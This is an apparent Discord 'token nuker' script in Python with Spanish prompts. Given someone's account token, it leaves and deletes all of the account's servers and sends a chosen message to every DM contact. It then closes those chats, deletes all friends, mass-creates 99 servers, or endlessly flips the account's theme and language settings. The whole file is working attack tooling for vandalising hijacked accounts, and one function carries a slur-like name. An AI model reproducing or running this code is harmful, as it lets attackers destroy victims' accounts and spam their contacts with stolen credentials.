import os, requests, signal, sys
from colorama import Fore
import random 

	
def exit_handler(signal, frame):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.RED + 'Adios' + Fore.RESET )
    sys.exit(0)

def main(token):
    os.system('cls' if os.name == 'nt' else 'clear')
    datos = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()

    print(Fore.RED + f"""
 /$$$$$$$$ /$$$$$$  /$$   /$$ /$$$$$$$$ /$$   /$$                     
|__  $$__//$$__  $$| $$  /$$/| $$_____/| $$$ | $$                     
   | $$  | $$  \ $$| $$ /$$/ | $$      | $$$$| $$                     
   | $$  | $$  | $$| $$$$$/  | $$$$$   | $$ $$ $$                     
   | $$  | $$  | $$| $$  $$  | $$__/   | $$  $$$$                     
   | $$  | $$  | $$| $$\  $$ | $$      | $$\  $$$                     
   | $$  |  $$$$$$/| $$ \  $$| $$$$$$$$| $$ \  $$                     
   |__/   \______/ |__/  \__/|________/|__/  \__/                     
                                                                      
                                                                      
                                                                      
 /$$$$$$$  /$$$$$$$  /$$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$$ 
| $$__  $$| $$__  $$| $$_____/ /$$__  $$ /$$__  $$| $$_____/| $$__  $$
| $$  \ $$| $$  \ $$| $$      | $$  \__/| $$  \__/| $$      | $$  \ $$
| $$$$$$$/| $$$$$$$/| $$$$$   |  $$$$$$ |  $$$$$$ | $$$$$   | $$$$$$$/
| $$____/ | $$__  $$| $$__/    \____  $$ \____  $$| $$__/   | $$__  $$
| $$      | $$  \ $$| $$       /$$  \ $$ /$$  \ $$| $$      | $$  \ $$
| $$      | $$  | $$| $$$$$$$$|  $$$$$$/|  $$$$$$/| $$$$$$$$| $$  | $$
|__/      |__/  |__/|________/ \______/  \______/ |________/|__/  |__/

                           
─────────────────────────
1- Nukea totalmente al token
2- Crear Servidores
3- EPILEPSIAAAA                       
─────────────────────────                     
          """)                                                                                                                                                                                                                                                                                                                                                     

    opciones = input(Fore.YELLOW + 'Opcion: ' + Fore.RESET)

    if opciones == '1':
        invite(datos, token)
    elif opciones == '2':
        servidores(datos, token)
    elif opciones == '3':
        nig(datos, token)
    else:
        input(Fore.RESET + "Opcion invalida...")
        main(token)
        
        
    

def invite(datos, token):
    invite = input(Fore.RED+ 'Invitacion para el token (sin discord.gg): ' + Fore.RESET)
    userGuilds = requests.get('https://discord.com/api/v9/users/@me/guilds', headers={'Authorization': token}).json()
    guildIds = []
    userFriends = requests.get('https://discord.com/api/v9/users/@me/relationships', headers={'Authorization': token}).json()
    userDms = requests.get('https://discord.com/api/v9/users/@me/channels', headers={'Authorization': token}).json()
    dmIds = []
    friendIds = []
    message = input(Fore.WHITE + 'Mensaje que deseas enviar a sus amigos: ' + Fore.RESET)
    requests.post(f'https://discord.com/api/v9/invites/{invite}', headers={'Authorization': token})

    for guild in userGuilds:
        guildIds.append(guild['id'])

    for id in guildIds:
        requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{id}', headers={'Authorization': token})

    for id in guildIds:
        requests.delete(f'https://discord.com/api/v9/guilds/{id}', headers={'Authorization': token})

    for dm in userDms:
        dmIds.append(dm['id'])

    for id in dmIds:
        requests.post(f'https://discord.com/api/v9/channels/{id}/messages', headers={'Authorization': token}, json={'content': message})
        requests.delete(f'https://discord.com/api/v9/channels/{id}', headers={'Authorization': token})

    for friend in userFriends:
        friendIds.append(friend['id'])

    for id in friendIds:
        requests.delete(f'https://discord.com/api/v9/users/@me/relationships/{id}', headers={'Authorization': token})

    requests.post(f'https://discord.com/api/v9/invites/{invite}', headers={'Authorization': token})

    input(Fore.RESET + 'Finalizado...')
    main(token)

    
        


def servidores(datos, token):
    guildName = input(Fore.WHITE + 'Nombre de los servidores que deseas crear: ' + Fore.RESET)
    for i in range(99):
        requests.post('https://discord.com/api/v9/guilds', headers={'Authorization': token}, json={'name': guildName, 'region': 'europe'})


    
def nig(datos, token):
    while True:
        setting = {'theme': random.choice(['dark', 'light']), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch('https://discord.com/api/v7/users/@me/settings', headers={'Authorization': token}, json=setting)


    





if __name__ == '__main__':
    os.system('title TOKEN PRESSER V 1' if os.name == 'nt' else '')
    os.system('cls' if os.name == 'nt' else 'clear')
    signal.signal(signal.SIGINT, exit_handler)
    token = input(Fore.YELLOW + 'Insert token: ' + Fore.RESET)
    main(token)
